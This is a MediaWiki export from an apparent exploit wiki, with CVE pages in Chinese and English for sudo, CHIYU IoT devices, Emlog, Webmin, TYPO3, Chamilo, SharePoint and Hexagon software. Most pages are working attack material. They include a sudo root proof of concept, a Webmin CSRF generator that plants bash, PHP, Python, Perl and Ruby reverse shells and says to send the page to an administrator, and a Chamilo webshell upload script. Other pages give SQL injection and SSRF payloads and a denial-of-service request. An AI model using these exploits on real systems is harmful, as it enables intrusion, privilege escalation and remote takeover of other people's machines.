      <parentid>123</parentid>
      <timestamp>2021-05-30T12:53:43Z</timestamp>
      <contributor>
        <username>0Tty ls</username>
        <id>97</id>
      </contributor>
      <comment>/* 漏洞簡介 */</comment>
      <origin>3652</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1734" sha1="c6g0cnh8pgcy7o3771csc83q44ypr15" xml:space="preserve">==漏洞簡介==
在sudo解析命令行參數的方式中發現了基於[https://zh.wikipedia.org/wiki/%E5%A0%86%E7%A9%8D 堆]的緩衝區溢出。任何本地用戶（普通用戶和系統用戶，sudoer和非sudoers）都可以利用此漏洞，而無需進行身份驗證，攻擊者不需要知道用戶的密碼。成功利用此漏洞可以獲得root權限。

用戶可以使用如下方法進行自查：以非root用戶登錄系統，並使用命令&lt;code&gt;sudoedit -s / &lt;/code&gt;

如果響應一個以&lt;code&gt;sudoedit:&lt;/code&gt;開頭的報錯，那麼表明存在漏洞。
如果響應一個以&lt;code&gt;usage:&lt;/code&gt;開頭的報錯，那麼表明補丁已經生效。
==漏洞測試成功的Linux發行版==
&lt;pre&gt;
Ubuntu 16.04.5 kernel 4.15.0-29-generic 

Ubuntu 18.04.1 kernel 4.15.0-20-generic 

Ubuntu 19.04 kernel 5.0.0-15-generic 

Ubuntu Mate 18.04.2 kernel 4.18.0-15-generic 

Linux Mint 19 kernel 4.15.0-20-generic 

Xubuntu 16.04.4 kernel 4.13.0-36-generic 

ElementaryOS 0.4.1 4.8.0-52-generic 

Backbox 6 kernel 4.18.0-21-generic 

Parrot OS 4.5.1 kernel 4.19.0- 

parrot1-13t-amd64 Kali kernel 4.19.0-

kali5-amd64 

Redcore 1806 (LXQT) kernel 4.16.16- 

redcoreMX 18.3 kernel 4.19.37-2~mx17+1 

RHEL 8.0 kernel 4.18.0-80.el8.x86_64 

Debian 9.4.0 kernel 4.9.0-6-amd64 

Debian 10.0.0 kernel 4.19.0-5-amd64 

Devuan 2.0.0 kernel 4.9.0-6-amd64 

SparkyLinux 5.8 kernel 4.19.0-5-amd64 

Fedora Workstation 30 kernel 5.0.9-301.fc30.x86_64 

Manjaro 18.0.3 kernel 4.19.23-1- 

MANJAROMageia 6 kernel 4.9.35-desktop-1.mga6 

Antergos 18.7 kernel 4.17.6-1-ARCH
&lt;/pre&gt;


==POC==
https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz


&lt;pre&gt;
cd CVE-2021-3156

make

./sudo-hax-me-a-sandwich
&lt;/pre&gt;
可發現成功獲得ROOT權限。</text>
      <sha1>c6g0cnh8pgcy7o3771csc83q44ypr15</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31642 CHIYU IoT Devices 拒絕服務漏洞</title>
    <ns>0</ns>
    <id>3358</id>
    <revision>
      <id>3922</id>
      <timestamp>2021-06-03T11:58:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: CHIYU IoT Devices - Denial of Service (DoS) # Date: 01/06/2021 # Exploit Author: sirpedrotavares # Vendor Homepage: https://www.chiyu-tech.com/m..."</comment>
      <origin>3922</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2106" sha1="5647c3x1twfsfl3peif6mhalj3n5uu1" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: CHIYU IoT Devices - Denial of Service (DoS)
# Date: 01/06/2021
# Exploit Author: sirpedrotavares
# Vendor Homepage: https://www.chiyu-tech.com/msg/msg88.html
# Software Link: https://www.chiyu-tech.com/category-hardware.html
# Version: BIOSENSE, Webpass, and BF-630, BF-631, and SEMAC   - all firmware versions &lt; June 2021
# Tested on: BIOSENSE, Webpass, and BF-630, BF-631, and SEMAC
# CVE: CVE-2021-31642
# Publication: https://seguranca-informatica.pt/dancing-in-the-iot-chiyu-devices-vulnerable-to-remote-attacks

Description: A denial of service condition exists after an integer overflow in several IoT devices from CHIYU Technology, including BIOSENSE, Webpass, and BF-630, BF-631, and SEMAC. The vulnerability can be explored by sending an unexpected integer (&gt; 32 bits) on the page parameter that will crash the web portal and making it unavailable until a reboot of the device.
CVE ID: CVE-2021-31642
CVSS: Medium- CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
URL: https://gitbook.seguranca-informatica.pt/cve-and-exploits/cves/chiyu-iot-devices#cve-2021-31642

Affected parameter: page=Component: if.cgi
Payload:
if.cgi?redirect=AccLog.htm&amp;failure=fail.htm&amp;type=go_log_page&amp;page=2781000

====HTTP request======
GET
/if.cgi?redirect=AccLog.htm&amp;failure=fail.htm&amp;type=go_log_page&amp;page=2781000
HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0)
Gecko/20100101 Firefox/87.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pt-PT,pt;q=0.8,en;q=0.5,en-US;q=0.3
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Referer: http://127.0.0.1/AccLog.htm
Cookie: fresh=
Upgrade-Insecure-Requests: 1



Steps to reproduce:
  1. Navigate to the vulnerable device
  2. Make a GET request to the CGI component (if.cgi)
  3. Append the payload at the end of the vulnerable parameter (page)
  4. Submit the request and observe payload execution


 Mitigation: The latest version of the CHIYU firmware should be installed
to mitigate this vulnerability.
&lt;/pre&gt;</text>
      <sha1>5647c3x1twfsfl3peif6mhalj3n5uu1</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31737 Emlog v5.3.1 - v6.0.0 後台RCE漏洞</title>
    <ns>0</ns>
    <id>2547</id>
    <revision>
      <id>3045</id>
      <timestamp>2021-05-22T02:38:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== &lt;pre&gt; Emlog v5.3.1 Emlog v6.0.0 &lt;/pre&gt;  ==POC== &lt;pre&gt; select "&lt;?php phpinfo();?&gt;" into outfile "/var/www/html/tet1/emlog_6.0.0/src/content/uploadfile/202104/2..."</comment>
      <origin>3045</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="283" sha1="rvsw49fdqpwdosynj5o7c0kku7vxte2" xml:space="preserve">==影響版本==
&lt;pre&gt;
Emlog v5.3.1
Emlog v6.0.0
&lt;/pre&gt;

==POC==
&lt;pre&gt;
select "&lt;?php phpinfo();?&gt;" into outfile "/var/www/html/tet1/emlog_6.0.0/src/content/uploadfile/202104/222.php";
&lt;/pre&gt;

通過在後台數據-備份數據庫進行構造惡意sql語句進行備份上傳-getshell</text>
      <sha1>rvsw49fdqpwdosynj5o7c0kku7vxte2</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31760 Webmin CSRF&amp;遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>1511</id>
    <revision>
      <id>1893</id>
      <timestamp>2021-04-25T08:24:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==截圖== [[File:ExploitPOC.png | 500px]]  ==EXP== &lt;pre&gt; import time, subprocess,random  print('''\033[1;37m  __  __           _     ____  _          _________  _     _..."</comment>
      <origin>1893</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4160" sha1="lu3icyc8e83qrt30fsyphv4jrf0sdcj" xml:space="preserve">==截圖==
[[File:ExploitPOC.png | 500px]]

==EXP==
&lt;pre&gt;
import time, subprocess,random

print('''\033[1;37m
 __  __           _     ____  _          _________  _     _            _    
|  \/  |         | |   |___ \| |        |___  / _ \| |   | |          | |   
| \  / | ___  ___| |__   __) | |           / / | | | | __| |_   _  ___| | __
| |\/| |/ _ \/ __| '_ \ |__ &lt;| |          / /| | | | |/ _` | | | |/ __| |/ /
| |  | |  __/\__ \ | | |___) | |  _ _    / /_| |_| | | (_| | |_| | (__|   &lt; 
|_|  |_|\___||___/_| |_|____/|_| (_|_)  /_____\___/|_|\__,_|\__, |\___|_|\_/
                                                             __/ |          
                                                            |___/           
    \033[1;m''')

for i in range(101):
    print(
        "\r\033[1;36m [&gt;] POC By \033[1;m \033[1;37mMesh3l\033[1;m \033[1;36m ( \033[1;m\033[1;37m@Mesh3l_911\033[1;m\033[1;36m )  &amp; \033[1;m \033[1;37mZ0ldyck\033[1;m\033[1;36m  ( \033[1;m\033[1;37m@electronicbots\033[1;m\033[1;36m ) \033[1;m {} \033[1;m".format(
            i), "\033[1;36m%\033[1;m", end="")
    time.sleep(0.02)
print("\n\n")

target = input(
    "\033[1;36m \n Please input ur target's webmin path e.g. ( https://webmin.Mesh3l-Mohammed.com/ ) &gt; \033[1;m")

if target.endswith('/'):
    target = target + 'proc/run.cgi'
else:
    target = target + '/proc/run.cgi'

ip = input("\033[1;36m \n Please input ur IP to set up the Reverse Shell e.g. ( 10.10.10.10 ) &gt; \033[1;m")

port = input("\033[1;36m \n Please input a Port to set up the Reverse Shell e.g. ( 1337 ) &gt; \033[1;m")

ReverseShell = input \
('''\033[1;37m
\n
1- Bash Reverse Shell \n
2- PHP Reverse Shell \n
3- Python Reverse Shell \n
4- Perl Reverse Shell \n
5- Ruby Reverse Shell \n
\033[1;m
\033[1;36mPlease insert the number Reverse Shell's type u want e.g. ( 1 ) &gt; \033[1;m''')

file_name = random.randrange(1000)

if ReverseShell == '1':
    ReverseShell = 'mkfifo /tmp/'+str(file_name)+'; nc '+ip+' '+port+' 0&lt;/tmp/'+str(file_name)+' | /bin/sh &gt;/tmp/'+str(file_name)+' 2&gt;&amp;1; rm /tmp/'+str(file_name)+''

elif ReverseShell == '2':
    ReverseShell = ''' php -r '$sock=fsockopen("''' + ip + '''",''' + port + ''');exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' '''

elif ReverseShell == '3':
    ReverseShell = ''' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("''' + ip + '''",''' + port + '''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' '''

elif ReverseShell == '4':
    ReverseShell = ''' perl -e 'use Socket;$i="''' + ip + '''";$p=''' + port + ''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};' '''

elif ReverseShell == '5':
    ReverseShell = ''' ruby -rsocket -e'f=TCPSocket.open("''' + ip + '''",''' + port + ''').to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)' '''

else:
    print("\033[1;36m \n Please Re-Check ur input :( \033[1;m \n")


def CSRF_Generator():
    with open('CSRF_POC.html', 'w') as POC:
        POC.write \
            ('''
&lt;html&gt;
        &lt;head&gt;
            &lt;meta name="referrer" content="never"&gt;
        &lt;/head&gt;
  &lt;body&gt;
    &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action="''' + target +'''" method="POST"&gt;
      &lt;input type="hidden" name="cmd" value="''' + ReverseShell + '''" /&gt;
      &lt;input type="hidden" name="mode" value="0" /&gt;
      &lt;input type="hidden" name="user" value="root" /&gt;
      &lt;input type="hidden" name="input" value="" /&gt;
      &lt;input type="hidden" name="undefined" value="" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
    ''')
    POC.close()

    print(
        "\033[1;36m\nThe CSRF_POC has been generated successfully , send it to a Webmin's Admin and wait for your Reverse Shell ^_^ \n \033[1;m")


def Netcat_listener():
    print()
    subprocess.run(["nc", "-nlvp "+port+""])


def main():
    CSRF_Generator()
    Netcat_listener()


if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>lu3icyc8e83qrt30fsyphv4jrf0sdcj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31761 Webmin XSS&amp;遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>1512</id>
    <revision>
      <id>1894</id>
      <timestamp>2021-04-25T08:26:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/electronicbots/CVE-2021-31761"</comment>
      <origin>1894</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="56" sha1="06rniw74ry8qn6sk6dyr5ninxtctfzn" xml:space="preserve">==EXP==
https://github.com/electronicbots/CVE-2021-31761</text>
      <sha1>06rniw74ry8qn6sk6dyr5ninxtctfzn</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31762 Webmin CSRF漏洞</title>
    <ns>0</ns>
    <id>1513</id>
    <revision>
      <id>1895</id>
      <timestamp>2021-04-25T08:27:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==簡介== 利用CSRF攻擊，通過Webmin的添加用戶功能創建特權用戶，然後通過特權用戶權限反彈shell。  ==EXP== https://github.com/electronicbots/CVE..."</comment>
      <origin>1895</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="186" sha1="nm5ppxk89ebv956cs1mooagm6zkesvo" xml:space="preserve">==簡介==
利用CSRF攻擊，通過Webmin的添加用戶功能創建特權用戶，然後通過特權用戶權限反彈shell。

==EXP==
https://github.com/electronicbots/CVE-2021-31762</text>
      <sha1>nm5ppxk89ebv956cs1mooagm6zkesvo</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31777 TYPO3 version 6.2.1 SQL注入漏洞</title>
    <ns>0</ns>
    <id>1811</id>
    <revision>
      <id>2228</id>
      <timestamp>2021-05-05T05:12:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/python3 # Author: @nu11secur1ty # CVE-2021-31777  from selenium import webdriver import time import os, sys   # Vendor: https://typo3.org/ website_lin..."</comment>
      <origin>2228</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1767" sha1="5es0w9qa8iqet2kj9f37xk74tmtbzrw" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/python3
# Author: @nu11secur1ty
# CVE-2021-31777

from selenium import webdriver
import time
import os, sys


# Vendor: https://typo3.org/
website_link="http://192.168.1.3/typo3_src-6.2.1/typo3/index.php"

# enter your login username
username="nu11secur1ty"

# enter your login password
password="password"

#enter the element for username input field
element_for_username="username"

#enter the element for password input field
element_for_password="p_field"

#enter the element for submit button
element_for_submit="commandLI"


#browser = webdriver.Safari() #for macOS users[for others use chrome vis
chromedriver]
browser = webdriver.Chrome() #uncomment this line,for chrome users
#browser = webdriver.Firefox() #uncomment this line,for chrome users

time.sleep(3)
browser.get((website_link))

try:
username_element = browser.find_element_by_name(element_for_username)
username_element.send_keys(username)
password_element  = browser.find_element_by_name(element_for_password)
password_element.send_keys(password)
signInButton = browser.find_element_by_name(element_for_submit)
signInButton.click()

# Exploit vulnerability MySQL user table by using backend.php vulnerability
time.sleep(3)
# Payload link
browser.get(("
http://192.168.1.3/typo3_src-6.2.1/typo3/alt_doc.php?edit[be_users][1]=edit&amp;returnUrl=mod.php%3FM%3Dsystem_BeuserTxBeuser%26moduleToken%3D56862cd856952bfd539277eebf7b21c2a85ff950#"))


print("The payload is deployed it is time to destroy some user...\n")
os.system('pause')

browser.close()

except Exception:
#### This exception is if the user is not found in the database or
something is wrong.
print("Sorry, but this user who you searching for is destroyed by using of
MySQL vulnerability in backend.php...")
&lt;/pre&gt;</text>
      <sha1>5es0w9qa8iqet2kj9f37xk74tmtbzrw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31933 Chamilo LMS 1.11.14 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>2375</id>
    <revision>
      <id>2857</id>
      <timestamp>2021-05-15T00:46:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Chamilo LMS 1.11.14 - Remote Code Execution (Authenticated) # Date: 13/05/2021 # Exploit Author: M. Cory Billington (@_th3y) # Vendor Homepage:..."</comment>
      <origin>2857</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2789" sha1="lzudttwor24iz46ouwy1iwrz1qr9vde" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Chamilo LMS 1.11.14 - Remote Code Execution (Authenticated)
# Date: 13/05/2021
# Exploit Author: M. Cory Billington (@_th3y)
# Vendor Homepage: https://chamilo.org
# Software Link: https://github.com/chamilo/chamilo-lms
# Version: 1.11.14
# Tested on: Ubuntu 20.04.2 LTS
# CVE: CVE-2021-31933
# Writeup: https://theyhack.me/CVE-2021-31933-Chamilo-File-Upload-RCE/

from requests import Session
from random import choice
from string import ascii_lowercase

import requests

# This is all configuration stuff, 
url = "http://127.0.0.1/chamilo-lms/"  # URL to remote host web root
user_name = "admin"  # User must be an administrator
password = "admin"
command = "id;whoami"

# Where you want to upload your webshell. Must be writable by web server user.
# This spot isn't protectec by .htaccess
webshell_path = 'web/' 
webshell_name = f"shell-{''.join(choice(ascii_lowercase) for _ in range(6))}.phar" # Just a random name for webshell file
content = f"&lt;?php echo `{command}`; ?&gt;" 

def main():
    # Run a context manager with a session object to hold login session after login
    with Session() as s:
        login_url = f"{url}index.php"
        login_data = {
            "login": user_name,
            "password": password
        }
        r = s.post(login_url, data=login_data) # login request

        # Check to see if login as admin user was successful.
        if "admin" not in r.url:
            print(f"[-] Login as {user_name} failed. Need to be admin")
            return
        print(f"[+] Logged in as {user_name}")
        print(f"[+] Cookie: {s.cookies}")
        file_upload_url = f"{url}main/upload/upload.php"
        # The 'curdirpath' is not santitized, so I traverse to  the '/var/www/html/chamilo-lms/web/build' directory. I can upload to /tmp/ as well
        php_webshell_file = {
            "curdirpath": (None, f"/../../../../../../../../../var/www/html/chamilo-lms/{webshell_path}"),
            "user_upload": (webshell_name, content)
            }
        
        ## Good command if you want to see what the request looks like without sending
        # print(requests.Request('POST', file_upload_url, files=php_webshell_file).prepare().body.decode('ascii'))

        # Two requests required to actually upload the file
        for i in range(2):
            s.post(file_upload_url, files=php_webshell_file)

        exploit_request_url = f"{url}{webshell_path}{webshell_name}"
        print("[+] Upload complete!")
        print(f"[+] Webshell: {exploit_request_url}")

        # This is a GET request to the new webshell to trigger code execution
        command_output = s.get(exploit_request_url)
        print("[+] Command output:\n")
        print(command_output.text)



if __name__ == "__main__":
    main()
&lt;/pre&gt;</text>
      <sha1>lzudttwor24iz46ouwy1iwrz1qr9vde</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31950 Microsoft SharePoint Server 16.0.10372.20060 SSRF漏洞</title>
    <ns>0</ns>
    <id>4127</id>
    <revision>
      <id>4755</id>
      <timestamp>2021-06-11T09:39:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==SSRF== &lt;pre&gt; # Exploit Title: Microsoft SharePoint Server 16.0.10372.20060 - 'GetXmlDataFromDataSource' Server-Side Request Forgery (SSRF) # Date: 09 Jun 2021 # Exploit Auth..."</comment>
      <origin>4755</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5682" sha1="1ytog2jcyz4nz7hbj5geytbl2x702wz" xml:space="preserve">==SSRF==
&lt;pre&gt;
# Exploit Title: Microsoft SharePoint Server 16.0.10372.20060 - 'GetXmlDataFromDataSource' Server-Side Request Forgery (SSRF)
# Date: 09 Jun 2021
# Exploit Author: Alex Birnberg
# Software Link: https://www.microsoft.com/en-us/download/details.aspx?id=57462
# Version: 16.0.10372.20060
# Tested on: Windows Server 2019
# CVE : CVE-2021-31950

#!/usr/bin/env python3

import html
import random
import string
import xml.sax.saxutils
import textwrap
import requests
import argparse
import xml.etree.ElementTree as ET
from requests_ntlm2 import HttpNtlmAuth
from urllib.parse import urlencode, urlparse

class Exploit:
  def __init__(self, args):
    o = urlparse(args.url)
    self.url = args.url
    self.service = o.path
    self.username = args.username
    self.password = args.password
    self.target = args.target
    self.headers = args.header 
    self.method = args.request
    self.data = args.data
    self.content_type = args.content_type
    self.s = requests.Session()
    self.s.auth = HttpNtlmAuth(self.username, self.password)
    self.s.headers = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36'
    }
    self.s.proxies = {
      'http': 'http://127.0.0.1:8080'
    }

  def trigger(self):
    headers = ''
    if self.headers:
      for header in self.headers:
        header = list(map(lambda x: x.strip(), header.split(':')))
        if len(header) != 2:
          continue
        headers += '&lt;dataurl:Header name="{}"&gt;{}&lt;/dataurl:Header&gt;'.format(header[0], header[1])
    method = ''
    bypass_local = ''
    if self.method and self.method.upper() == 'POST':
      method = 'HTTP Post'
    else:
      method = 'HTTP Get'
      bypass_local = '&lt;dataurl:Arguments&gt;&lt;dataurl:Argument Name="{0}"&gt;{0}&lt;/dataurl:Argument&gt;&lt;/dataurl:Arguments&gt;'.format(''.join(random.choice(string.ascii_letters) for i in range(16)))
    content_type = ''
    if self.content_type and len(self.content_type):
      content_type = '&lt;dataurl:ContentType&gt;{}&lt;/dataurl:ContentType&gt;'.format(self.content_type)
    data = ''
    if self.data and len(self.data):
      data = '&lt;dataurl:PostData Encoding="Decode"&gt;{}&lt;/dataurl:PostData&gt;'.format(html.escape(self.data).encode('ascii', 'xmlcharrefreplace').decode('utf-8'))
    query_xml = textwrap.dedent('''\
    &lt;udc:DataSource xmlns:udc="http://schemas.microsoft.com/data/udc" xmlns:udcs="http://schemas.microsoft.com/data/udc/soap" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dsp="http://schemas.microsoft.com/sharepoint/dsp" xmlns:dataurl="http://schemas.microsoft.com/sharepoint/dsp/xmlurl"&gt;
      &lt;udc:ConnectionInfo&gt;
        &lt;udcs:Location href=""&gt;XMLURLDataAdapter&lt;/udcs:Location&gt;
        &lt;soap:Header&gt;
          &lt;dsp:versions&gt;
          &lt;/dsp:versions&gt;
          &lt;dsp:request method="query" /&gt;
        &lt;/soap:Header&gt;
        &lt;soap:Body&gt;
          &lt;dsp:queryRequest&gt;
            &lt;dsp:ptQuery&gt;
              &lt;dataurl:Headers&gt;
                &lt;dataurl:Url href="{}" Method="{}"/&gt;
                {}
                {}
                {}
                {}
              &lt;/dataurl:Headers&gt;
            &lt;/dsp:ptQuery&gt;
          &lt;/dsp:queryRequest&gt;
        &lt;/soap:Body&gt;
      &lt;/udc:ConnectionInfo&gt;
    &lt;/udc:DataSource&gt;'''.format(self.target, method, bypass_local, headers, data, content_type))
    query_xml = xml.sax.saxutils.escape(query_xml.replace('\r', '').replace('\n', ''))	
    data = textwrap.dedent('''\
      &lt;?xml version="1.0" encoding="utf-8"?&gt;
      &lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
        &lt;soap:Body&gt;
          &lt;GetXmlDataFromDataSource xmlns="http://microsoft.com/sharepoint/webpartpages"&gt;
            &lt;queryXml&gt;{}&lt;/queryXml&gt;
          &lt;/GetXmlDataFromDataSource&gt;
        &lt;/soap:Body&gt;
      &lt;/soap:Envelope&gt;'''.format(query_xml))
    r = self.soap('webpartpages', 'http://microsoft.com/sharepoint/webpartpages/GetXmlDataFromDataSource', data)
    root = ET.fromstring(r.content)
    try:
      namespaces = {
        'soap': 'http://schemas.xmlsoap.org/soap/envelope/'
      }
      value = list(root.find('soap:Body', namespaces).iter())[2]   
      if value.tag == 'faultcode':
        print('Error:', list(root.find('soap:Body', namespaces).iter())[3].text)
      else:
        print(value.text)
    except:
      print(r.content)
      pass

  def soap(self, service, action, data):
    headers = {
      'SOAPAction': '"{}"'.format(action),
      'Host': 'localhost',
      'Content-Type': 'text/xml; charset=utf-8',
    }
    return self.s.post('{}/_vti_bin/{}.asmx'.format(self.url, service), headers=headers, data=data)

if __name__ == '__main__':
  parser = argparse.ArgumentParser()
  parser.add_argument('--url', help='Base URL', required=True, metavar='&lt;url&gt;')
  parser.add_argument('--username', help='Username of team site owner', required=True, metavar='&lt;username&gt;')
  parser.add_argument('--password', help='Password of team site owner', required=True, metavar='&lt;password&gt;')
  parser.add_argument('--target', help='Target URL to work with', required=True, metavar='&lt;target&gt;')
  parser.add_argument('-H', '--header', help='Pass custom header(s) to server', action='append', metavar='&lt;header&gt;')
  parser.add_argument('-X', '--request', help='Specify request command to use', metavar='&lt;command&gt;')
  parser.add_argument('-d', '--data', help='HTTP POST data', metavar='&lt;data&gt;') 
  parser.add_argument('-c', '--content-type', help='Value for the "Content-Type" header', metavar='&lt;type&gt;')
  exploit = Exploit(parser.parse_args())
  exploit.trigger()
&lt;/pre&gt;</text>
      <sha1>1ytog2jcyz4nz7hbj5geytbl2x702wz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31955 Windows內核信息泄露漏洞</title>
    <ns>0</ns>
    <id>5237</id>
    <revision>
      <id>5995</id>
      <timestamp>2021-06-27T08:26:59Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; The exploit works on all 64-bit vulnerable targets. &lt;/pre&gt;  ==POC== https://github.com/mavillon1/CVE-2021-31955-POC"</comment>
      <origin>5995</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="177" sha1="mv9dsrmwb92h7abss8rpqh2cc2zgykn" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
The exploit works on all 64-bit vulnerable targets.
&lt;/pre&gt;

==POC==
https://github.com/mavillon1/CVE-2021-31955-POC</text>
      <sha1>mv9dsrmwb92h7abss8rpqh2cc2zgykn</sha1>
    </revision>
    <revision>
      <id>5999</id>
      <parentid>5995</parentid>
      <timestamp>2021-06-27T08:28:06Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5999</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="188" sha1="i31q27oo5vdq71870smgw5r5zn085xa" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
The exploit works on all 64-bit vulnerable targets.
&lt;/pre&gt;

==POC==
https://github.com/mavillon1/CVE-2021-31955-POC</text>
      <sha1>i31q27oo5vdq71870smgw5r5zn085xa</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-31955 Windows內核信息泄露漏洞/zh-cn</title>
    <ns>0</ns>
    <id>5243</id>
    <revision>
      <id>6002</id>
      <timestamp>2021-06-27T08:29:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-31955 Windows內核信息泄露漏洞"</comment>
      <origin>6002</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="152" sha1="9ak605i6b33rciwa9zftmcxuqx9tb6s" xml:space="preserve">&lt;languages /&gt;
==漏洞影响==
&lt;pre&gt;
The exploit works on all 64-bit vulnerable targets.
&lt;/pre&gt;

==POC==
https://github.com/mavillon1/CVE-2021-31955-POC</text>
      <sha1>9ak605i6b33rciwa9zftmcxuqx9tb6s</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-32051 Hexagon G!nius Auskunftsportal SQL 注入漏洞</title>
    <ns>0</ns>
    <id>2347</id>
    <revision>
      <id>2795</id>
      <timestamp>2021-05-12T08:59:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; CVE-2021-32051 Hexagon G!nius Auskunftsportal before 5.0.0.0 allows SQL injection via the GiPWorkflow/Service/DownloadPublicFile id parameter.  [Additional Info..."</comment>
      <origin>2795</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2919" sha1="cngn5ku38i6pnvghg7rto4kfhgw5a0x" xml:space="preserve">==INFO==
&lt;pre&gt;
CVE-2021-32051 Hexagon G!nius Auskunftsportal before 5.0.0.0 allows SQL injection via the GiPWorkflow/Service/DownloadPublicFile id parameter.

[Additional Information]
PoC Payload: id=test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)||
CHR(107)||CHR(112)||CHR(122)||CHR(113)||CHR(107)||CHR(71)||CHR(98)||CHR(88)||CHR(104)||CHR(102)||CHR(99)||
CHR(67)||CHR(113)||CHR(109)||CHR(69)||CHR(110)||CHR(67)||CHR(76)||CHR(103)||CHR(84)||CHR(83)||CHR(109)||
CHR(121)||CHR(84)||CHR(73)||CHR(116)||CHR(79)||CHR(103)||CHR(87)||CHR(84)||CHR(120)||CHR(119)||CHR(75)||
CHR(76)||CHR(114)||CHR(120)||CHR(103)||CHR(85)||CHR(87)||CHR(112)||CHR(111)||CHR(70)||CHR(108)||CHR(73)||
